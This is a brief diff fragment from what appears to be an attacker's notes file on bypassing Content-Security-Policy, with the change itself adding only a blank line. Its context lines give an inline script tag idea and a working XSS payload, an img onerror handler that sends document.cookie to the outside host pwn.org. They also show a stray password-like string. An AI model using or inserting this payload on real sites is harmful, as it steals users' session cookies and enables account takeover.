@@ -12,4 +12,5 @@ password: *)(&
 # Bypass Content-Security-Policy
 
 using inline script tag : `<script>/*some stuff*/</script>`
+
 if its blocked we can just use : `<img src onerror="location.href='//pwn.org/index.php?content='.concat(document.cookie);">`
